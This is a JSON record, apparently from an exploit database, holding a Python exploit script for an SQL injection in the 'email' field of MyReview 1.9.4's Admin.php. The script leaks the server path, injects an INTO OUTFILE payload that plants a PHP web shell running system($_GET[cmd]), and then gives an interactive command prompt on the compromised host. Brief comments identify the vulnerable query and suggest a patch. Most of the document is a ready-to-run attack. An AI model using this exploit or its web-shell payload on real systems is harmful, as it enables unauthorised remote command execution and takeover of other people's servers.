{
  "id": "2397",
  "title": "MyReview 1.9.4 - &#039;email&#039; SQL Injection / Code Execution",
  "cve": "CVE-2006-4957",
  "vuln_type": "sqli",
  "code": "# MyReview 1.9.4 SQL Injection exploit\r\n#\r\n#\r\n# http://myreview.lri.fr/\r\n#\r\n# in functions.php starting from line 382\r\n# ............\t\r\n#\tfunction GetMember ($email, $db, $mode=\"array\")\r\n#\t{\r\n#  \t\t$query = \"SELECT * FROM PCMember WHERE email = '$email'\" ;\r\n#\t\tresult = $db->execRequete ($query);\r\n# .......... \r\n# \r\n# $email is not checked before used into $query\r\n# \r\n# for patch \r\n# \r\n# 1. add \"$email=addslashes(trim($email));\" before $query\r\n# 2. use something else, very buggy script\r\n#\r\n# by STILPU (dmooray[a lu']gmail.com)\r\n#\r\n\r\n\r\nimport httplib, urllib, re, urlparse, sys\r\n\r\ndef usage():\r\n\tprint \"\"\"\r\nMyReview 1.9.4 SQL Injection exploit\r\n\r\nUsage: python exploit.py http://target/pathtomyreview/\r\n\r\nRequires warnings to be displayed so we cat get the localpath and FILES/ to be writable\r\n\r\nby STILPU  (dmooray[a lu']gmail.com)\r\n\r\n\"\"\"\r\n\tsys.exit(1)\r\n\r\ndef getlocalpath(server):\r\n\tparams=urllib.urlencode({'email':'\\'','motDePasse':'a','ident':'Log in'})\r\n\theaders={\"Content-type\": \"application/x-www-form-urlencoded\",\"Accept\": \"text/plain\"}\r\n\tcon = httplib.HTTPConnection(server)\r\n\tcon.request(\"POST\",path+\"Admin.php\",params,headers)\r\n\tresp=con.getresponse()\r\n\tdata=resp.read()\r\n\ttry:\r\n\t\tlocalpath=re.search('>/.*B',data[0:10000]).group().replace('>','',1).replace('B','',1)\t\r\n\texcept Exception: print \"Exploit failed: didn`t manage to get localpath\"; sys.exit(1)\r\n\treturn localpath\r\n\t\r\ndef sendshell(server):\r\n\tshell=\"'<?php error_reporting(0); ini_set(\\\"max_execution_time\\\",0); system($_GET[cmd]); /*'\"\r\n\tsql=\"' union select \" + shell + \",0,0,0,'*/ ?>' into outfile '\" +getlocalpath(server)+ \"FILES/STILPU.php' from PCMember#\"\r\n\theaders={\"Content-type\": \"application/x-www-form-urlencoded\",\"Accept\": \"text/plain\"}\r\n\tparams=urllib.urlencode({'email':sql,'motDePasse':'a','ident':'Log in'})\r\n\tcon = httplib.HTTPConnection(server)\r\n\tcon.request(\"POST\",path+\"Admin.php\",params,headers)\r\n\r\ndef sendcmd(server):\r\n\twhile 1:\r\n\t\ttry:\r\n\t\t\tcmd=raw_input('sh$ ')\r\n\t\t\tcmd=cmd.replace(\" \",\"+\")\r\n\t\t\tcon = httplib.HTTPConnection(target)\r\n\t\t\tcon.request(\"GET\",path+\"FILES/STILPU.php?cmd=\"+cmd)\r\n\t\t\tresp=con.getresponse()\r\n\t\t\tdata=resp.read()\r\n\t\t\tif (cmd==\"exit\" or cmd==\"quit\"): break\r\n\t\t\tprint data\r\n\t\texcept KeyboardInterrupt: break\t\r\n\r\n\r\nif __name__ == '__main__':\r\n\r\n\tif len(sys.argv) < 2:\r\n\t\tusage()\t\t\r\n\t\r\n\telse:\r\n\t\turl = sys.argv[1]\r\n\t\turl = urlparse.urlsplit(url)\r\n\t\ttarget = url[1]\r\n\t\tpath = url[2]\r\n\t\t\r\n\t\tsendshell(target)\r\n\t\tsendcmd(target)\r\n\r\n# milw0rm.com [2006-09-19]",
  "url": "https://www.exploit-db.com/exploits/2397"
}